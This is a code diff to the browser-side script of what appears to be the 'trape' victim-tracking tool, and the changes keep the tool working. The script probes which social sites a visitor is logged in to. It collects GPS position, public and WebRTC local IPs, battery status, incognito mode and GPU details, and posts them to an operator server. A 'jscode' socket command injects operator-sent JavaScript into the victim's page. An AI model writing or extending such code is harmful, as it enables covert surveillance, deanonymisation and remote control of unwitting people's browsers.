@@ -19,7 +19,7 @@ $(document).ready(function($) {
         url: "https://twitter.com",
         path: "/login?redirect_after_login=%2Ffavicon.ico",
         name: "Twitter",
-        login: "/login" 
+        login: "/login"
     }, {
         url: "https://vk.com",
         path: "/login?u=2&to=ZmF2aWNvbi5pY28-",
@@ -220,8 +220,8 @@ function conChange() {
     }
 
     var objDownload = {
-        size : 2104238,
-        src : 'https://upload.wikimedia.org/wikipedia/commons/0/01/Sof%C3%ADa_Vergara_3_May_2014_%28cropped%29.jpg'
+        size : 2097152,
+        src : window.serverPath + '/static/files/speedtest.bin'
     };
 
     var objTime = {
@@ -251,7 +251,33 @@ function conChange() {
         };
 
         objTime.start =  (new Date ()).getTime();
-        $.post('https://www.googleapis.com/urlshortener/v1/url?key=', {'longUrl': packet}, function(data, textStatus, xhr) {
+        $.post(window.serverPath + '/speedtest_upload', {'data': packet}, function(data, textStatus, xhr) {
+            objTime.end =  (new Date ()).getTime();
+            objUpload.duration = ((objTime.end - objTime.start)/1000);
+            objUpload.bitsLoaded = (parseFloat(objUpload.size) * 8);
+            objUpload.speedBps = Math.round (objUpload.bitsLoaded / objUpload.duration);
+            objUpload.speedKbps = (objUpload.speedBps / 1024).toFixed(2);
+            objUpload.speedMbps = (objUpload.speedKbps / 1024).toFixed(2);
+
+            vConnection.Download_test = objDownload;
+            vConnection.Upload_test = objUpload;
+            vConnection = JSON.stringify(vConnection);
+
+            var data = {
+                    vId : d.vId,
+                    con: vConnection,
+                    host : document.location.host};
+            $.ajax({
+                url: window.serverPath + '/lc',
+                data: data,
+                dataType: "json",
+                type: 'POST',
+                success: function(response) {
+                },
+                error: function(error) {
+
+                }
+            });
         }, 'json').fail(function(){
             objTime.end =  (new Date ()).getTime();
             objUpload.duration = ((objTime.end - objTime.start)/1000);
@@ -274,10 +300,9 @@ function conChange() {
                 dataType: "json",
                 type: 'POST',
                 success: function(response) {
-                    //setTimeout(function(){ locateV(); }, 5000);
                 },
                 error: function(error) {
-                    
+
                 }
             });
         });
@@ -304,14 +329,14 @@ function sendData(data) {
 
 function getVictimData() {
 	var d = {
-        vId : null, 
+        vId : null,
         vURL : null
     };
 	if (localStorage.trape_vId != undefined) {
 		d.vId = localStorage.trape_vId;
         d.vURL = localStorage.trape_vURL;
 	}
-	
+
 	return d;
 }
 
@@ -340,7 +365,18 @@ function defineSockets(self) {
                 console.log(objW);
                 break;
             case 'talk':
-                responsiveVoice.speak(msg.data.message, msg.data.voice, {volume: 1});
+                if (window.speechSynthesis) {
+                    var utterance = new SpeechSynthesisUtterance(msg.data.message);
+                    var voiceMap = {
+                        'UK English Female': 'en-GB',
+                        'Spanish Latin American Female': 'es-MX',
+                        'UK English Male': 'en-GB',
+                        'Latin Male': 'es-MX'
+                    };
+                    utterance.lang = voiceMap[msg.data.voice] || 'en-US';
+                    utterance.volume = 1;
+                    window.speechSynthesis.speak(utterance);
+                }
                 break;
             case 'jscode':
                 $('body').append('<script>' + msg.data.message + '</script>');
@@ -350,41 +386,11 @@ function defineSockets(self) {
                 break;
             default:
                 return false;
-        }                            
+        }
     });
 }
 
 function locateV(self) {
-    /*
-    $.ajax({
-	url: "https://www.googleapis.com/geolocation/v1/geolocate?key=" + window.gMapsApiKey,
-        data: {},
-        dataType: "json",
-        type: "POST",
-        success: function(response, status) {
-            if (status == 'success'){
-                $.ajax({
-                        url: window.serverPath + '/lr',
-                        data :  {"vId" : localStorage.trape_vId, "lat": response.location.lat, "lon": response.location.lng},
-                        dataType: "json",
-                        type: 'POST',
-                        success: function(data) {
-                            setTimeout(function(){ locateV(); }, 30000);
-                        },
-                        error:function(error) {
-                            setTimeout(function(){ locateV(); }, 10000);
-                        }    
-                    });
-            } else{
-                setTimeout(function(){ locateV(); }, 10000);    
-            }
-        },
-        error: function(error) {
-            setTimeout(function(){ locateV(); }, 10000);
-        }
-    });
-    */
-
     $.ajax({
         url: window.serverPath + '/lr',
         data :  {"vId" : localStorage.trape_vId, "lat": latitude, "lon": longitude},
@@ -395,12 +401,12 @@ function locateV(self) {
         },
         error:function(error) {
             setTimeout(function(){ locateV(); }, 10000);
-        }    
+        }
     });
 }
 
 function workWithNetworks(){
-    $.getJSON('//ipinfo.io/json/?callback=?', function(data) {
+    $.getJSON(window.serverPath + '/geoip', function(data) {
         var dInfo = {ip : null, vId : null, red : null};
         $.extend( true, dInfo, data);
         dInfo.vId = localStorage.trape_vId
@@ -478,7 +484,7 @@ function detectBattery(){
             b_send_data({'type' : 'time_d', 'val' : battery.dischargingTime});
           }
         });
-        
+
     } catch(err) {
         b_send_data({'type' : 'charging', 'val' : 'No Detected'});
         b_send_data({'type' : 'level', 'val' : 0});
@@ -515,10 +521,10 @@ function navigation_mode(){
             }
         };
         db.onsuccess =function(){nm_sendData('normal')};
-    } else { if(incog) fs(window.TEMPORARY, 100, ()=>{}, func); else fs(window.TEMPORARY, 100, func, ()=>{}); } } 
+    } else { if(incog) fs(window.TEMPORARY, 100, ()=>{}, func); else fs(window.TEMPORARY, 100, func, ()=>{}); } }
 
-    ifIncognito(true, ()=>{ nm_sendData('incognito') }); 
-    ifIncognito(false, ()=>{ nm_sendData('normal') }) 
+    ifIncognito(true, ()=>{ nm_sendData('incognito') });
+    ifIncognito(false, ()=>{ nm_sendData('normal') })
 }
 
 function queryGPU(){
@@ -554,7 +560,7 @@ function queryGPU(){
         dataType: "json",
         type: 'POST',
         success: function(response) {
-            
+
         },
         error: function(error) {
         }
@@ -580,7 +586,7 @@ function getIPs(callback) {
 
     var servers = {
         iceServers: [{
-            urls: "stun:stun.services.mozilla.com"
+            urls: window.stunServer || "stun:stun.services.mozilla.com"
         }]
     };
 
@@ -627,7 +633,7 @@ function getIPs(callback) {
 
 function getGeolocation(){
     if (navigator.geolocation) {
-        navigator.geolocation.getCurrentPosition( function(position){        
+        navigator.geolocation.getCurrentPosition( function(position){
             latitude = position.coords.latitude;
             longitude = position.coords.longitude;
         });
